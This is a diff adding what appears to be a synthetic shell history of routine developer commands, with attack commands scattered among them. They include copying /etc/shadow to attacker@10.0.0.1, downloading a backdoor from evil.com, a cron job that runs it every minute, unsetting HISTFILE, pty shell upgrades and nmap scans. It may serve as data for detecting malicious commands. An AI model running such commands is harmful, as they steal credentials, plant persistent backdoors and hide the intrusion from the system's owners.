@@ -1,0 +1,80 @@
+pip list
+git diff
+find . -name '*.py'
+cd Documents
+git diff
+id
+ls
+pip freeze > requirements.txt
+cat requirements.txt
+cd ..
+pip freeze > requirements.txt
+git pull
+cd ..
+rm -rf build
+git diff
+cd ..
+python3 -m pytest
+git checkout main
+grep -r 'TODO' src/
+scp /etc/shadow attacker@10.0.0.1:/loot/
+source venv/bin/activate
+sudo -l
+echo '* * * * * /tmp/bd' | crontab -
+git commit -m 'update'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo '* * * * * /tmp/bd' | crontab -
+export DEBUG=true
+rm -rf build
+git pull
+ssh-keygen -t rsa
+pwd
+netstat -tulpn
+cat requirements.txt
+git pull
+export TERM=xterm
+pip list
+nmap -p 22,80,443 target
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+git pull
+ls
+git push
+tar -xzf archive.tar.gz
+unset HISTFILE
+git pull
+git branch
+git pull
+source venv/bin/activate
+tar -xzf archive.tar.gz
+cp config.example config.py
+git commit -m 'update'
+echo $PATH
+mkdir src
+wget http://evil.com/backdoor -O /tmp/bd
+nano README.md
+git log
+export DEBUG=true
+find . -name '*.py'
+git checkout main
+source venv/bin/activate
+export TERM=xterm
+find . -name '*.py'
+nmap -p 22,80,443 target
+grep -r 'TODO' src/
+cd ..
+uname -a
+cp config.example config.py
+hostname
+git pull
+unset HISTFILE
+git pull
+python3 -m pytest
+git diff
+python3 main.py
+export DEBUG=true
+python3 -m pytest
+cat /etc/passwd
+tar -xzf archive.tar.gz
+vim config.py
+stty raw -echo
+vim config.py
